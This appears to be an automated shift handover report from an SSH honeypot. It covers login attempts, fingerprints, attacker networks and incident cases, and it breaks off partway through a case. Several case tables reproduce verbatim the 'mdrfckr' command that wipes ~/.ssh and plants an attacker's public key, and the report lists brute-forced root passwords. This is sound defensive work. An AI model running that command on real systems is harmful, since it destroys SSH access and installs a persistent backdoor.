# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-01 |
| **Generated At** | 2026-06-01T23:41:45Z |
| **Shift Time** | 23:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **112** |
| Confirmed Threats | **109** |
| False Positives Filtered | **3** (2.7%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **9** |
| High Severity Cases | **35** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **77** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **77** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **26** |
| Unique Passwords | **42** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 36 |
| `345gs5662d34` | 17 |
| `vmuser` | 1 |
| `cps` | 1 |
| `desktop` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 17 |
| `3245gs5662d34` | 17 |
| `123456` | 3 |
| `A123456A` | 2 |
| `` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 17 |
| `root` | `3245gs5662d34` | 17 |
| `root` | `A123456A` | 2 |
| `root` | `` | 1 |
| `root` | `admin` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin` | `192.42.116.46` | 2026-06-01T21:49:52 |
| `root` | `A123456A` | `81.192.46.36` | 2026-06-01T21:53:49 |
| `root` | `3245gs5662d34` | `81.192.46.36` | 2026-06-01T21:53:53 |
| `root` | `a123123` | `45.123.217.22` | 2026-06-01T22:01:40 |
| `root` | `3245gs5662d34` | `45.123.217.22` | 2026-06-01T22:01:42 |
| `root` | `168168` | `45.123.217.22` | 2026-06-01T22:03:30 |
| `root` | `A123456A` | `45.123.217.22` | 2026-06-01T22:05:18 |
| `root` | `Admin101` | `45.123.217.22` | 2026-06-01T22:06:59 |
| `root` | `Huawei2026` | `45.123.217.22` | 2026-06-01T22:10:21 |
| `root` | `proxmox` | `45.123.217.22` | 2026-06-01T22:16:55 |
| `root` | `admin159` | `45.123.217.22` | 2026-06-01T22:18:38 |
| `root` | `Tw123456@` | `45.123.217.22` | 2026-06-01T22:25:25 |
| `root` | `Secure@2025` | `45.123.217.22` | 2026-06-01T22:35:18 |
| `root` | `Pa$$w0rd.` | `45.123.217.22` | 2026-06-01T22:37:03 |
| `root` | `@WSX4rfv` | `45.123.217.22` | 2026-06-01T22:40:23 |
| `root` | `Yg12345678` | `45.123.217.22` | 2026-06-01T22:42:07 |
| `root` | `qq123456@` | `45.123.217.22` | 2026-06-01T22:43:47 |
| `root` | `123qweasdZXC` | `20.235.225.32` | 2026-06-01T23:15:01 |
| `root` | `3245gs5662d34` | `20.235.225.32` | 2026-06-01T23:15:03 |
| `root` | `Admin@123123` | `20.235.225.32` | 2026-06-01T23:16:46 |
| `root` | `Computer1` | `20.235.225.32` | 2026-06-01T23:22:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **112** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 81 |
| OpenSSH | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 60 | 5 |
| `f555226df196...` | Mirai/variant | 20 | 4 |
| `1cc79c7da9b5...` | libssh-based | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 60 | 5 | Modern SSH client |
| `f555226df196...` | libssh | 20 | 4 | Mirai/variant |
| `1cc79c7da9b5...` | OpenSSH | 1 | 1 | libssh-based |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.235.225.32`, `81.192.46.36`, `45.123.217.22`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **16** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS46198` | Trilogy Dominicana, S.A. | 1 | HIGH |
| `AS58541` | CHINATELECOM SHANDONG QINGDAO IDC | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | MEDIUM |
| `AS398324` | Censys, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (35)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ce78b020fb18

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]46` |
| **First Seen** | 2026-06-01 21:49 |
| **Last Seen** | 2026-06-01 21:50 |
| **Session Duration** | 21s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 21:49:49` | `cowrie.session.connect` |
| `2026-06-01 21:49:50` | `cowrie.client.version` |
| `2026-06-01 21:49:50` | `cowrie.client.kex` |
| `2026-06-01 21:49:52` | `cowrie.client.fingerprint` |
| `2026-06-01 21:49:52` | `cowrie.login.failed` |
| `2026-06-01 21:49:52` | `cowrie.login.success` |
| `2026-06-01 21:50:10` | `cowrie.direct-tcpip.request` |
| `2026-06-01 21:50:11` | `cowrie.direct-tcpip.ja4` |
| `2026-06-01 21:50:11` | `cowrie.direct-tcpip.data` |
| `2026-06-01 21:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]46` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef8a817f62f

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]36` |
| **First Seen** | 2026-06-01 21:53 |
| **Last Seen** | 2026-06-01 21:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 21:53:49` | `cowrie.session.connect` |
| `2026-06-01 21:53:49` | `cowrie.client.version` |
| `2026-06-01 21:53:49` | `cowrie.client.kex` |
| `2026-06-01 21:53:49` | `cowrie.login.success` |
| `2026-06-01 21:53:50` | `cowrie.session.params` |
| `2026-06-01 21:53:50` | `cowrie.command.input` |
| `2026-06-01 21:53:50` | `cowrie.command.failed` |
| `2026-06-01 21:53:50` | `cowrie.log.closed` |
| `2026-06-01 21:53:50` | `cowrie.session.params` |
| `2026-06-01 21:53:50` | `cowrie.command.input` |
| `2026-06-01 21:53:50` | `cowrie.session.file_download` |
| `2026-06-01 21:53:50` | `cowrie.log.closed` |
| `2026-06-01 21:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]36` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f27a8f4259d6

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]36` |
| **First Seen** | 2026-06-01 21:53 |
| **Last Seen** | 2026-06-01 21:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 21:53:52` | `cowrie.session.connect` |
| `2026-06-01 21:53:52` | `cowrie.client.version` |
| `2026-06-01 21:53:52` | `cowrie.client.kex` |
| `2026-06-01 21:53:53` | `cowrie.login.success` |
| `2026-06-01 21:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]36` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5c3a122174d

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:01 |
| **Last Seen** | 2026-06-01 22:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:01:40` | `cowrie.session.connect` |
| `2026-06-01 22:01:40` | `cowrie.client.version` |
| `2026-06-01 22:01:40` | `cowrie.client.kex` |
| `2026-06-01 22:01:40` | `cowrie.login.success` |
| `2026-06-01 22:01:41` | `cowrie.session.params` |
| `2026-06-01 22:01:41` | `cowrie.command.input` |
| `2026-06-01 22:01:41` | `cowrie.command.failed` |
| `2026-06-01 22:01:41` | `cowrie.log.closed` |
| `2026-06-01 22:01:41` | `cowrie.session.params` |
| `2026-06-01 22:01:41` | `cowrie.command.input` |
| `2026-06-01 22:01:41` | `cowrie.session.file_download` |
| `2026-06-01 22:01:41` | `cowrie.log.closed` |
| `2026-06-01 22:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19ce5b412252

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:01 |
| **Last Seen** | 2026-06-01 22:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:01:42` | `cowrie.session.connect` |
| `2026-06-01 22:01:42` | `cowrie.client.version` |
| `2026-06-01 22:01:42` | `cowrie.client.kex` |
| `2026-06-01 22:01:42` | `cowrie.login.success` |
| `2026-06-01 22:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ae5cdf71901

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:03 |
| **Last Seen** | 2026-06-01 22:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:03:30` | `cowrie.session.connect` |
| `2026-06-01 22:03:30` | `cowrie.client.version` |
| `2026-06-01 22:03:30` | `cowrie.client.kex` |
| `2026-06-01 22:03:30` | `cowrie.login.success` |
| `2026-06-01 22:03:30` | `cowrie.session.params` |
| `2026-06-01 22:03:30` | `cowrie.command.input` |
| `2026-06-01 22:03:30` | `cowrie.command.failed` |
| `2026-06-01 22:03:30` | `cowrie.log.closed` |
| `2026-06-01 22:03:30` | `cowrie.session.params` |
| `2026-06-01 22:03:30` | `cowrie.command.input` |
| `2026-06-01 22:03:30` | `cowrie.session.file_download` |
| `2026-06-01 22:03:30` | `cowrie.log.closed` |
| `2026-06-01 22:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98932055ca37

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:03 |
| **Last Seen** | 2026-06-01 22:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:03:32` | `cowrie.session.connect` |
| `2026-06-01 22:03:32` | `cowrie.client.version` |
| `2026-06-01 22:03:32` | `cowrie.client.kex` |
| `2026-06-01 22:03:32` | `cowrie.login.success` |
| `2026-06-01 22:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d27e275262d0

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:05 |
| **Last Seen** | 2026-06-01 22:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:05:17` | `cowrie.session.connect` |
| `2026-06-01 22:05:17` | `cowrie.client.version` |
| `2026-06-01 22:05:17` | `cowrie.client.kex` |
| `2026-06-01 22:05:18` | `cowrie.login.success` |
| `2026-06-01 22:05:18` | `cowrie.session.params` |
| `2026-06-01 22:05:18` | `cowrie.command.input` |
| `2026-06-01 22:05:18` | `cowrie.command.failed` |
| `2026-06-01 22:05:18` | `cowrie.log.closed` |
| `2026-06-01 22:05:18` | `cowrie.session.params` |
| `2026-06-01 22:05:18` | `cowrie.command.input` |
| `2026-06-01 22:05:18` | `cowrie.session.file_download` |
| `2026-06-01 22:05:18` | `cowrie.log.closed` |
| `2026-06-01 22:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34d86dc8e5ef

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:05 |
| **Last Seen** | 2026-06-01 22:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:05:19` | `cowrie.session.connect` |
| `2026-06-01 22:05:19` | `cowrie.client.version` |
| `2026-06-01 22:05:19` | `cowrie.client.kex` |
| `2026-06-01 22:05:20` | `cowrie.login.success` |
| `2026-06-01 22:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4c88456525

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:06 |
| **Last Seen** | 2026-06-01 22:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:06:59` | `cowrie.session.connect` |
| `2026-06-01 22:06:59` | `cowrie.client.version` |
| `2026-06-01 22:06:59` | `cowrie.client.kex` |
| `2026-06-01 22:06:59` | `cowrie.login.success` |
| `2026-06-01 22:06:59` | `cowrie.session.params` |
| `2026-06-01 22:06:59` | `cowrie.command.input` |
| `2026-06-01 22:06:59` | `cowrie.command.failed` |
| `2026-06-01 22:06:59` | `cowrie.log.closed` |
| `2026-06-01 22:06:59` | `cowrie.session.params` |
| `2026-06-01 22:06:59` | `cowrie.command.input` |
| `2026-06-01 22:06:59` | `cowrie.session.file_download` |
| `2026-06-01 22:06:59` | `cowrie.log.closed` |
| `2026-06-01 22:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64ceb5ef2c8

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:07 |
| **Last Seen** | 2026-06-01 22:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:07:01` | `cowrie.session.connect` |
| `2026-06-01 22:07:01` | `cowrie.client.version` |
| `2026-06-01 22:07:01` | `cowrie.client.kex` |
| `2026-06-01 22:07:01` | `cowrie.login.success` |
| `2026-06-01 22:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b41702e5685

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:10 |
| **Last Seen** | 2026-06-01 22:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:10:20` | `cowrie.session.connect` |
| `2026-06-01 22:10:20` | `cowrie.client.version` |
| `2026-06-01 22:10:20` | `cowrie.client.kex` |
| `2026-06-01 22:10:21` | `cowrie.login.success` |
| `2026-06-01 22:10:21` | `cowrie.session.params` |
| `2026-06-01 22:10:21` | `cowrie.command.input` |
| `2026-06-01 22:10:21` | `cowrie.command.failed` |
| `2026-06-01 22:10:21` | `cowrie.log.closed` |
| `2026-06-01 22:10:21` | `cowrie.session.params` |
| `2026-06-01 22:10:21` | `cowrie.command.input` |
| `2026-06-01 22:10:21` | `cowrie.session.file_download` |
| `2026-06-01 22:10:21` | `cowrie.log.closed` |
| `2026-06-01 22:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae8b6fec5831

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:10 |
| **Last Seen** | 2026-06-01 22:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:10:22` | `cowrie.session.connect` |
| `2026-06-01 22:10:22` | `cowrie.client.version` |
| `2026-06-01 22:10:22` | `cowrie.client.kex` |
| `2026-06-01 22:10:23` | `cowrie.login.success` |
| `2026-06-01 22:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01b75d7fc7f0

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:16 |
| **Last Seen** | 2026-06-01 22:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
